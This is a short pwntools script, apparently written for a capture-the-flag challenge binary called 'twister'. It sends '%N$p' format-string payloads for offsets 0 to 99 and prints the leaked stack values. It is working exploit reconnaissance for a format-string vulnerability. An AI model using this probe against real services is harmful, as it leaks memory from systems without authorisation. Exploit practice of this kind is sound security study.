from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

exe = './twister'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warning'

for i in range(100):
    try:
        p = start()
        p.sendlineafter(b':', '%{}$p'.format(i).encode())
        p.recvuntil(b'Hello ')
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
